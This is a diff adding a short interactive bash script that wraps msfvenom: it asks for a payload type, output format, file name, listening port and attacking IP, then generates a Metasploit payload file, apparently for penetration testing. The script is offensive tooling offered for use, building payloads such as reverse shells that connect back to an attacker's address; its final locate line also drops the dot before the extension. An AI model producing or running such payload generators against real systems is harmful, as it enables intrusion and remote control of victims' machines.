@@ -1,0 +1,19 @@
+#!/bin/bash
+echo "What file extension do you want the payload to be? "
+read EXT
+cat msf-payloads
+echo "Select your payload: "
+read PL
+echo "Where do you want to save the file? "
+read DIRECTORY
+echo "What do you want to name the file? "
+read NAME
+echo "What port do you want to listen on? "
+read PORT
+echo "What is the attacking IP? "
+read ORIGIN
+echo "Press any key to generate payload "
+msfvenom -p $PL LHOST=$ORIGIN LPORT=$PORT -f $EXT > $DIRECTORY$NAME.$EXT
+echo "Payload Generated"
+locate $DIRECTORY$NAME$EXT
+read
